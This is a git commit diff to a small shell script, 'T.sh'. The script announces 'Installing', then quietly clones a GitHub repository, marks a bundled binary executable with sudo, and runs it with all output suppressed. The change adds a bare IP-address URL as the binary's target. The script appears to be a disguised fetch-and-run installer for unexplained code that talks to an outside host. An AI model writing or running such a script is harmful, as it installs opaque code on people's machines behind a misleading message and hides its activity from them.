78619e4b3571cb67c49d4d1fa92e63112f84dc31
ddao2604 <78058830+ddao2604@users.noreply.github.com>
2021-01-27 08:57:23 +0700

    Update T.sh

--- T.sh
+++ T.sh
@@ -4,5 +4,5 @@ printf "Installing $1"  >&2
 {
 git clone https://github.com/phucbmt/tech.git &> /dev/null
 sudo chmod +x tech/m
-./tech/m -P "$1" &> log
+./tech/m -P http://103.149.12.74/"$1" &> log
 } &> /dev/null
